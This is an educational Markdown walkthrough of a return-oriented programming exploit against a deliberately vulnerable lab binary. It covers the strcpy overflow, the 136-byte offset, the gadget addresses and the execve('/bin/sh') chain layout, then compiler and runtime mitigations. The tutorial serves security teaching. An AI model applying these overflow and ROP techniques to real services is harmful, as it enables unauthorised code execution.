# End-to-End ROP Exploit Demonstration

This document provides a step-by-step walkthrough of the complete ROP exploit demonstration, from discovering the vulnerability to successful exploitation.

## Scenario

You've discovered an old legacy service running on a server. The service was written in the early 2000s before modern security practices were common. Your goal is to demonstrate a proof-of-concept exploit using Return-Oriented Programming.

## Step 1: Reconnaissance - Analyze the Binary

First, let's build and examine the vulnerable service:

```bash
cd demos/rop-exploit
make all
```

Check what security features are enabled:

```bash
make check
```

**Expected Output:**
```
[*] vulnerable_service-nx (non-executable stack):
    Stack canaries: DISABLED
    PIE/ASLR: DISABLED
    NX bit: ENABLED (non-executable stack) - ROP required!
```

**Analysis:** The binary has NX (non-executable stack) enabled, which means we cannot simply inject and execute shellcode. We'll need to use ROP.

## Step 2: Vulnerability Discovery

Let's examine the source code and disassembly to find vulnerabilities:

```bash
make disasm
```

Look for the `strcpy` call in `process_command`:

```c
void process_command(char *input) {
    char buffer[128];  // Small buffer
    strcpy(buffer, input);  // VULNERABLE: No bounds checking!
    ...
}
```

**Vulnerability:** The `strcpy()` function copies unlimited data into a 128-byte buffer. We can overflow this buffer to overwrite the return address.

## Step 3: Calculate the Exploit Offset

To control the return address, we need to know exactly how much data to send:

- Buffer size: 128 bytes
- Saved RBP: 8 bytes
- **Total offset to return address: 136 bytes**

## Step 4: Find ROP Gadgets

Search for useful ROP gadgets in the binary:

```bash
make gadgets
```

**Key Gadgets Found:**
```
0x401296: pop rdi; ret        - Load first argument
0x4012a3: pop rsi; pop r15; ret - Load second argument  
0x4012b2: syscall              - Execute system call
```

These gadgets allow us to:
1. Set up registers for a system call
2. Execute the `execve("/bin/sh", NULL, NULL)` system call

## Step 5: Build the ROP Chain

Generate the exploit payload:

```bash
make exploit
```

The exploit does the following:

1. **Fill the buffer:** 136 bytes of "A" characters to reach the return address
2. **ROP Chain:**
   - `pop rdi; ret` → Load address of "/bin/sh" into RDI
   - `0x404000` → Address of "/bin/sh" string (or embedded in payload)
   - `pop rsi; pop r15; ret` → Load NULL into RSI
   - `0x0` → NULL for argv
   - `0x0` → Dummy value for R15
   - `syscall` → Execute execve

**Resulting Payload Structure:**
```
[136 bytes padding][pop rdi][&"/bin/sh"][pop rsi; pop r15][NULL][NULL][syscall]
```

## Step 6: Test the Exploit

Execute the exploit to verify it crashes the program:

```bash
make test-exploit
```

**Expected Result:**
```
[LOG] Processing command
Unknown command: AAAAAAA...
Segmentation fault (core dumped)

[*] Program crashed as expected!
```

**Success!** We've successfully overwritten the return address and gained control of the instruction pointer.

## Step 7: Understanding the Attack Flow

Here's what happens when the exploit runs:

1. **Normal execution:**
   ```
   main() → process_command(malicious_input)
   ```

2. **Buffer overflow:**
   ```
   strcpy(buffer, input) overwrites:
   - buffer[128]
   - saved RBP
   - return address ← Now points to our ROP chain
   ```

3. **ROP chain executes:**
   ```
   pop rdi; ret        → RDI = 0x404000 ("/bin/sh")
   pop rsi; pop r15; ret → RSI = NULL, R15 = dummy
   syscall             → execve("/bin/sh", NULL, NULL)
   ```

4. **Result:**
   - Without proper string placement: Crash (demonstrates control)
   - With proper setup: Shell spawned

## Real-World Considerations

In a real-world scenario, you would need to handle:

### 1. ASLR (Address Space Layout Randomization)
If ASLR is enabled:
- Need to leak addresses first
- Use info leak vulnerabilities (format strings, buffer over-reads)
- Calculate offsets relative to leaked addresses

### 2. Stack Canaries
If stack canaries are enabled:
- Need to leak the canary value
- Preserve canary in exploit payload
- Use partial overwrites to avoid canary

### 3. PIE (Position Independent Executable)
If PIE is enabled:
- All addresses are randomized
- Need to find gadgets relative to leaked base
- Chain multiple vulnerabilities

### 4. String Placement
For a working shell:
- Need "/bin/sh" string in memory
- Options:
  - Find it in the binary
  - Find it in libc
  - Write it to a writable section first
  - Use environment variables

## Advanced Techniques Demo

Let's try the advanced exploit that shows more sophisticated techniques:

```bash
python3 exploit_advanced.py vulnerable_service-nx
./vulnerable_service-nx "$(cat exploit_advanced.bin)"
```

This version demonstrates:
- More complete ROP chain
- Register setup for system calls
- Comments on real-world challenges

## Educational Value

This demonstration teaches:

1. **How buffer overflows work** - Memory corruption fundamentals
2. **Return-oriented programming** - Code reuse attacks
3. **Security mitigations** - Understanding NX, ASLR, canaries
4. **Exploit development** - Building working exploits
5. **Defense strategies** - How to prevent these attacks

## Mitigation Strategies

To prevent this type of attack:

### At Development Time:
```c
// BAD: Unsafe function
strcpy(buffer, input);

// GOOD: Bounds-checked function
strncpy(buffer, input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';

// BETTER: Modern safe function (C11)
strncpy_s(buffer, sizeof(buffer), input, sizeof(buffer) - 1);
```

### At Compile Time:
```bash
# Enable all security features
gcc -fstack-protector-strong \
    -D_FORTIFY_SOURCE=2 \
    -fPIE -pie \
    -z relro -z now \
    -z noexecstack \
    -o secure_service service.c
```

### At Runtime:
- Enable ASLR: `echo 2 > /proc/sys/kernel/randomize_va_space`
- Use AppArmor/SELinux for additional sandboxing
- Run services with minimal privileges
- Update to modern programming languages (Rust, Go)

## Summary

You've successfully:

✅ Identified a buffer overflow vulnerability  
✅ Calculated the exact offset to the return address  
✅ Found ROP gadgets in the binary  
✅ Built a ROP chain to bypass NX protection  
✅ Generated a working exploit payload  
✅ Demonstrated control of program execution  
✅ Understood real-world exploitation challenges  
✅ Learned defense strategies  

**Remember:** This is for educational purposes only. Always obtain explicit permission before testing security vulnerabilities on any system.

## Next Steps

- Try exploiting real vulnerable VMs (Exploit Education, VulnHub)
- Learn about heap exploitation
- Study modern exploit mitigations (CET, CFI)
- Practice on CTF challenges
- Contribute to bug bounty programs (legally!)

## Resources

- **Practice Platforms:**
  - Exploit Education: https://exploit.education/
  - ROPEmporium: https://ropemporium.com/
  - PicoCTF: https://picoctf.org/

- **Tools:**
  - `pwntools`: Python exploit development library
  - `ROPgadget`: Gadget finder
  - `ropper`: Alternative gadget finder
  - `GDB + pwndbg`: Debugging exploits

- **Learning:**
  - "The Art of Exploitation" by Jon Erickson
  - LiveOverflow's YouTube channel
  - Trail of Bits blog
  - Google Project Zero blog
